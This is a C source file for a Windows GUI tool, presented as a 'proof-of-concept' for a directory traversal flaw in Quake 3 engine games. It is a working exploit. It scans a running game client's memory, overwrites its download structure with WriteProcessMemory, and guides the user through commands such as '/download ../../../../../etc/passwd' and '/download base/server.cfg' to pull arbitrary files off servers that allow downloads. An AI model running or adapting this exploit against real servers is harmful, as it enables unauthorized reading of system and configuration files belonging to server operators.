/*
    Copyright 2007 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>
#include <windows.h>
#include <tlhelp32.h>
#include "q3dirtrav_res.h"

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER2        VER "\r\n" \
                    "  bug found by Ludwig Nussel and Thilo Schulz\r\n" \
                    "  thanx to ^Zodiac for asking me to create this\r\n" \
                    "  tool and moreover to BobaFett for the idea and\r\n" \
                    "  technical help for realizing it!\r\n" \
                    "by Luigi Auriemma\r\n" \
                    "e-mail: aluigi@autistici.org\r\n" \
                    "web:    aluigi.org\r\n" \
                    "\r\n"
#define TEXTSZ      1024
#define INFO1       "- this \"almost\" universal proof-of-concept is able to test the directory\r\n" \
                    "  traversal bug described here:\r\n" \
                    "    http://www.securityfocus.com/archive/1/archive/1/433349/100/0/threaded\r\n" \
                    "- it affects the games based on the Quake 3 engine and allows an attacker to\r\n" \
                    "  download almost any file from a server on which sv_allowdownload is set to 1\r\n" \
                    "\r\n" \
                    "- the test process is composed by the following 3 steps:\r\n" \
                    "  . select the client's process\r\n" \
                    "  . insert the name of the file you want to be created in your game folder\r\n" \
                    "  . open the console of your client and type: /download file\r\n" \
                    "\r\n" \
                    "- so now all you need to do is launching your game client and joining a server\r\n" \
                    "- when you have done it please select the process in the above list\r\n"
#define INFO2       "- now you must insert the name of the file you want to create in your game\r\n" \
                    "  folder, this file is just the one you are going to get from the server but\r\n" \
                    "  with a different name for avoiding the overwriting of your same files.\r\n" \
                    "  if you don't know what to use insert tmp.txt\r\n" \
                    "- then click on the \"activate exploit\" button\r\n"
#define INFO3       "- now I scan the process for finding where is located the clientConnection_t\r\n" \
                    "  structure in memory and I will modify it for allowing the downloading\r\n"
#define INFO4       "- perfect, now all you need to do is opening the console from your game client\r\n" \
                    "  and type /download followed by the name of the file you want to download\r\n" \
                    "  usually the console can be opened with the ~ (tilde) key or shift + ~\r\n" \
                    "  the following are some examples of download commands:\r\n" \
                    "    /download base/server.cfg\r\n" \
                    "    /download baseq3/server.cfg\r\n" \
                    "    /download main/server.cfg\r\n" \
                    "    /download mainta/server.cfg\r\n" \
                    "    /download maintt/server.cfg\r\n" \
                    "    /download uo/server.cfg\r\n" \
                    "    /download rocmod/server.cfg\r\n" \
                    "    /download osp\\server.cfg\r\n" \
                    "    /download pb\\svlogs\\00000001.log\r\n" \
                    "    /download ..\\..\\..\\..\\windows\\win.ini\r\n" \
                    "    /download ../../../../../etc/passwd\r\n" \
                    "    some games like Medal of honor don't need the slash before the command\r\n" \
                    "\r\n" \
                    "- if everything was correct in your game folder you will find the output\r\n" \
                    "  file you choosed containing the data downloaded from the server\r\n" \
                    "\r\n" \
                    "- if you want you can refresh the processes and exploit the same process again\r\n" \
                    "  or another one, for example if you want to download another file and so on\r\n"



#define MAX_OSPATH      256
#define MAX_INFO_STRING 1024
typedef int qboolean;
typedef int fileHandle_t;

typedef struct {
    fileHandle_t download;
    char        downloadTempName[MAX_OSPATH];
    char        downloadName[MAX_OSPATH];
    int         downloadNumber;
    int         downloadBlock;
    int         downloadCount;
    int         downloadSize;
    char        downloadList[MAX_INFO_STRING];
    qboolean    downloadRestart;
} mini_clientConnection_t;

#define FINDME  "%s.tmp"



int     cod = 0;
u8      outfile[TEXTSZ] = "";



void process_list(HWND hwnd, DWORD pid, BYTE **baddr, DWORD *size) {
    PROCESSENTRY32  Process;
    MODULEENTRY32   Module;
    HANDLE          snapProcess,
                    snapModule;
    DWORD           mypid;
    BOOL            b;
    u8              process_name[TEXTSZ];

#define STARTPROC(X,Y) \
            snap##X = CreateToolhelp32Snapshot(Y, Process.th32ProcessID); \
            X.dwSize = sizeof(X); \
            for(b = X##32First(snap##X, &X); b; b = X##32Next(snap##X, &X)) { \
                X.dwSize = sizeof(X);
#define ENDPROC(X)  } CloseHandle(snap##X);

    SendMessage(GetDlgItem(hwnd, IDC_PROCLIST), LB_RESETCONTENT, (WPARAM)0, (LPARAM)0);

    mypid = GetCurrentProcessId();
    Process.th32ProcessID = 0;
    STARTPROC(Process, TH32CS_SNAPPROCESS)
        STARTPROC(Module, TH32CS_SNAPMODULE)

            if(pid) {
                if(pid == Module.th32ProcessID) {
                    if(baddr) *baddr = Module.modBaseAddr;
                    if(size)  *size  = Module.modBaseSize;
                }
                break;
            }

            if(Module.th32ProcessID == mypid) continue;

            snprintf(process_name, sizeof(process_name),
                "%10u %s",
                (u32)Module.th32ProcessID,
                Module.szExePath);
            process_name[sizeof(process_name) - 1] = 0;

            SendDlgItemMessage(hwnd, IDC_PROCLIST, LB_ADDSTRING, 0, (LPARAM)process_name);

            break;  // we need only the first one!

        ENDPROC(Module)
    ENDPROC(Process)

#undef STARTPROC
#undef ENDPROC
}



void winerr(u8 *errmsg) {
    u8     *message = NULL;

    if(errmsg) {
        MessageBox(0, errmsg, VER, MB_ICONERROR | MB_OK | MB_TASKMODAL);
        return;
    }
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        GetLastError(),
        0,
        (char *)&message,
        0,
        NULL);
    if(message) {
        MessageBox(0, message, VER, MB_ICONERROR | MB_OK | MB_TASKMODAL);
        LocalFree(message);
    }
}



int find_bytes(u8 *buff, int buffsz, u8 *str, int strsz) {
    u8      *p,
            *l;

    l = buff + buffsz - strsz;
    for(p = buff; p <= l; p++) {
        if(!memcmp(p, str, strsz)) return(p - buff);
    }
    return(-1);
}



void patch_process(HWND hwnd, DWORD pid, BYTE *baddr, DWORD size) {
    mini_clientConnection_t clc;
    HANDLE  process;
    int     off,
            buffsz;
    u8      messages[100],
            instr[32],
            *buff   = NULL,
            *errmsg = NULL;

    SetDlgItemText(hwnd, IDC_INFO, INFO3);

    process = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
    if(!process) goto quit;

    buffsz = 4 * 1024 * 1024;   // 4 megabytes are usually enough
    if(size < buffsz) buffsz= size;

    buff = malloc(buffsz);
    if(!buff) goto quit;

    sprintf(messages, "- start the search of %s on %u bytes of memory\r\n", FINDME, buffsz);
    SetDlgItemText(hwnd, IDC_INFO, messages);

    if(!ReadProcessMemory(
      process,
      (LPCVOID)baddr,
      buff,
      buffsz,
      NULL)) goto quit;

    off = find_bytes(buff, buffsz, FINDME, strlen(FINDME) + 1);
    if(off < 0) {
        errmsg = "the first string has not been found in the process";
        goto quit;
    }

    instr[0] = 0x68;
    *(u32 *)(instr + 1) = (u32)baddr + off;
    off = find_bytes(buff, buffsz, instr, 5);
    if(off < 0) {
        errmsg = "the second string has not been found in the process";
        goto quit;
    }

    off = *(u32 *)(buff + off + 11);
    off -= 4;
    if(cod) off -= MAX_OSPATH;
    sprintf(messages,
        "%s"
        "- the download structure seems located at offset 0x%08x\r\n",
        cod ? "- used Call of Duty offset - MAX_OSPATH\r\n" : "",
        off);
    SetDlgItemText(hwnd, IDC_INFO, messages);

    memset(&clc, 0, sizeof(clc));
    strcpy(clc.downloadTempName, outfile);
    strcpy(clc.downloadName,     outfile);

    sprintf(messages, "- write the download fields in the clientConnection_t structure\r\n");
    SetDlgItemText(hwnd, IDC_INFO, messages);

    if(!WriteProcessMemory(
      process,
      (LPCVOID)off,
      &clc,
      sizeof(clc),
      NULL)) goto quit;

    CloseHandle(process);
    free(buff);

    SetDlgItemText(hwnd, IDC_INFO, INFO4);
    EnableWindow(GetDlgItem(hwnd, IDC_EXPLOIT), FALSE);

    return;

quit:
    if(process) CloseHandle(process);
    if(buff) free(buff);
    winerr(errmsg);
}



void center_dialog(HWND hwnd) {
    RECT    rc,
            myRc;

    GetWindowRect(GetDesktopWindow(), &rc);
    GetWindowRect(hwnd, &myRc);
    MoveWindow(hwnd,
        rc.right - (myRc.right - myRc.left) -
        ((rc.right - rc.left) - (myRc.right - myRc.left)) / 2,
        rc.bottom - (myRc.bottom - myRc.top) -
        ((rc.bottom - rc.top) - (myRc.bottom - myRc.top)) / 2,
        myRc.right - myRc.left,
        myRc.bottom - myRc.top,
        FALSE);
}



BOOL CALLBACK DlgProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {
    int     sel;
    HANDLE  hlist;
    HFONT   hf;
    DWORD   pid,
            size;
    BYTE    *baddr;
    u8      buff[TEXTSZ];

    switch(Message) {
        case WM_INITDIALOG: {
            center_dialog(hwnd);
            EnableWindow(GetDlgItem(hwnd, IDC_EXPLOIT), FALSE);
            hf = CreateFont(10, 0, 0, 0, 0, FALSE, 0, 0, 0, 0, 0, 0, 0, "Lucida Console");
            SendDlgItemMessage(hwnd, IDC_PROCLIST, WM_SETFONT, (WPARAM)hf, TRUE);
            process_list(hwnd, 0, NULL, NULL);
            SetDlgItemText(hwnd, IDC_INFO, INFO1);
            } break;
        case WM_COMMAND: {
            switch(LOWORD(wParam)) {
                case IDC_PROCLIST: {
                    if((HIWORD(wParam) == LBN_DBLCLK) || (HIWORD(wParam) == LBN_SELCHANGE)) {
                        SetDlgItemText(hwnd, IDC_INFO, INFO2);
                    }
                    } break;
                case IDC_REFRESH: {
                    process_list(hwnd, 0, NULL, NULL);
                    SetDlgItemText(hwnd, IDC_INFO, INFO1);
                    } break;
                case IDC_FILENAME: {
                    hlist = GetDlgItem(hwnd, IDC_PROCLIST);
                    if(SendMessage(hlist, LB_GETCURSEL, (WPARAM)0, (LPARAM)0) < 0) break;
                    GetDlgItemText(hwnd, IDC_FILENAME, outfile, sizeof(outfile));
                    EnableWindow(GetDlgItem(hwnd, IDC_EXPLOIT), outfile[0] ? TRUE : FALSE);
                    } break;
                case IDC_EXPLOIT: {
                    if(!outfile[0]) break;
                    hlist = GetDlgItem(hwnd, IDC_PROCLIST);
                    sel = SendMessage(hlist, LB_GETCURSEL, (WPARAM)0, (LPARAM)0);
                    if(sel < 0) break;
                    SendMessage(hlist, LB_GETTEXT, (WPARAM)sel, (LPARAM)buff);
                    sscanf(buff, "%10u", &pid);
                    if(stristr(buff + 10, "cod") && stristr(buff + 10, "mp")) cod = 1;
                    process_list(hwnd, pid, &baddr, &size);
                    patch_process(hwnd, pid, baddr, size);
                    } break;
                case IDC_ABOUT: {
                    MessageBox(0, VER2, VER, MB_OK | MB_TASKMODAL);
                    } break;
                default: {
                    } break;
            }
            } break;
        case WM_CLOSE: {
            DestroyWindow(hwnd);
            } break;
        case WM_DESTROY: {
            PostQuitMessage(0);
            } break;
        default: {
            return(0);
            } break;
    }
    return(0);
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    return(DialogBox(hInstance, MAKEINTRESOURCE(IDD_MAIN), NULL, DlgProc));
}


